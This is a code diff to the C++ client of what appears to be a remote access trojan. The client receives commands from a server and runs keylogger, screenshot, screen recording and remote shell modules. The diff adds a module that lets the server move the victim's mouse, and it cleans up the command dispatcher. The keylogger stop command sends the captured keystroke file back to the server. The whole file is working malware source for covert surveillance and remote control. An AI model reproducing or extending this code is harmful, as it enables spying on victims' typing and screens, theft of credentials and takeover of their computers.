@@ -1,4 +1,4 @@
-//g++ client.cpp .\modules\codes\module.cpp .\modules\codes\ss_module.cpp .\modules\codes\keylogger_module.cpp .\modules\codes\screen_recording_module.cpp .\modules\codes\remote_shell_module.cpp -o client.exe -lws2_32 -lgdiplus -lgdi32 -lole32
+//g++ client.cpp .\modules\codes\module.cpp .\modules\codes\ss_module.cpp .\modules\codes\keylogger_module.cpp .\modules\codes\screen_recording_module.cpp .\modules\codes\remote_shell_module.cpp .\modules\codes\mouse_module.cpp -o client.exe -lws2_32 -lgdiplus -lgdi32 -lole32
 
 // TO DO
 // move functions to the modules directory and minimize client.cpp
@@ -22,6 +22,7 @@
 #include "modules/headers/keylogger_module.h"
 #include "modules/headers/screen_recording_module.h"
 #include "modules/headers/remote_shell_module.h"
+#include "modules/headers/mouse_module.h"
 
 #ifdef _WIN32
 #include <winsock2.h>
@@ -57,6 +58,7 @@ Keylogger_Module keylogger;
 SS_Module screenshot;
 ScreenRecording_Module screenRecording;
 RemoteShell_Module remoteShell;
+Mouse_Module mouseModule;
 
 
 // Signal handler to catch termination signals (like Ctrl+C)
@@ -160,9 +162,31 @@ int receive_reply(SOCKET sock, char* buffer, int bufSize) {
 }
 
 // Handle commands received from server
-void handle_command(const std::string& command, SOCKET sock) {
+void handle_command(const std::string& raw_command, SOCKET sock) {
+    // Trim newline/carriage returns (recv ile gelebilir)
+    std::string command = raw_command;
+    while (!command.empty() && (command.back() == '\n' || command.back() == '\r')) command.pop_back();
+
     std::cout << "[Command] Received: " << command << std::endl;
 
+    // --- MOUSE handling ---
+    // Accept either "MOUSE <subcmd>" or plain "up"/"down"/"left"/"right" or "move:x:y"
+    if (command.rfind("MOUSE ", 0) == 0) {
+        std::string sub = command.substr(6); // after "MOUSE "
+        std::cout << "[Mouse] MOUSE prefix detected, executing: " << sub << std::endl;
+        mouseModule.processCommand(sub);
+        return;
+    }
+
+    if (command == "up" || command == "down" || command == "left" || command == "right" ||
+        command.rfind("move:", 0) == 0) 
+    {
+        std::cout << "[Mouse] Direct mouse command detected: " << command << std::endl;
+        mouseModule.processCommand(command);
+        return;
+    }
+
+    // --- Existing module commands ---
     if (command == "TAKE_SCREENSHOT") {
         std::cout << "[Action] Taking screenshot..." << std::endl;
 
@@ -192,28 +216,26 @@ void handle_command(const std::string& command, SOCKET sock) {
         } catch (const std::exception& e) {
             std::cerr << "[Error] Exception in screenshot handling: " << e.what() << std::endl;
         }
+        return;
     }
     else if (command == "START_KEYLOGGER") {
         std::cout << "[Action] Starting keylogger module..." << std::endl;
-        
-        try{
+        try {
             keylogger.run();
-        }
-        catch(const std::exception& e){
+        } catch (const std::exception& e) {
             std::cerr << "[Error] Exception in keylogger handling: " << e.what() << std::endl;
         }
-
+        return;
     }
     else if (command == "STOP_KEYLOGGER") {
         std::cout << "[Action] Stopping keylogger..." << std::endl;
-        
         keylogger.stopKeylogger(sock);
         const char* keylogFileName = keylogger.getKeylogFileName();
         std::cout << "[Action] Keylogger stopped and file sent. File: " << keylogFileName << std::endl;
+        return;
     }
     else if (command == "START_SCREEN_RECORDING") {
         std::cout << "[Action] Starting screen recording..." << std::endl;
-        
         try {
             if (screenRecording.startRecording(sock, 10, 30)) { // 10 seconds, 30 FPS
                 std::cout << "[Success] Screen recording started" << std::endl;
@@ -223,20 +245,20 @@ void handle_command(const std::string& command, SOCKET sock) {
         } catch (const std::exception& e) {
             std::cerr << "[Error] Exception in screen recording: " << e.what() << std::endl;
         }
+        return;
     }
     else if (command == "STOP_SCREEN_RECORDING") {
         std::cout << "[Action] Stopping screen recording..." << std::endl;
-        
         try {
             screenRecording.stopRecording();
             std::cout << "[Success] Screen recording stopped" << std::endl;
         } catch (const std::exception& e) {
             std::cerr << "[Error] Exception in stopping screen recording: " << e.what() << std::endl;
         }
+        return;
     }
     else if (command == "START_REMOTE_SHELL") {
         std::cout << "[Action] Starting remote shell..." << std::endl;
-        
         try {
             if (remoteShell.startRemoteShell(sock)) {
                 std::cout << "[Success] Remote shell started" << std::endl;
@@ -246,21 +268,25 @@ void handle_command(const std::string& command, SOCKET sock) {
         } catch (const std::exception& e) {
             std::cerr << "[Error] Exception in remote shell: " << e.what() << std::endl;
         }
+        return;
     }
     else if (command == "STOP_REMOTE_SHELL") {
         std::cout << "[Action] Stopping remote shell..." << std::endl;
-        
         try {
             remoteShell.stopRemoteShell();
             std::cout << "[Success] Remote shell stopped" << std::endl;
         } catch (const std::exception& e) {
-            std::cerr << "[Error] Exception in stopping remote shell: " << e.what() << std::endl;
+            std::cerr << "[Error] Exception in stopping remote shell" << std::endl;
         }
+        return;
     }
     else {
         std::cout << "[Action] Unknown command, echoing back: " << command << std::endl;
+        // Eğer unknown komuta özel bir davranış istemiyorsan burası yeterli
+        return;
     }
 }
+
 
 // Connection handler in a separate thread
 void handle_connection() {
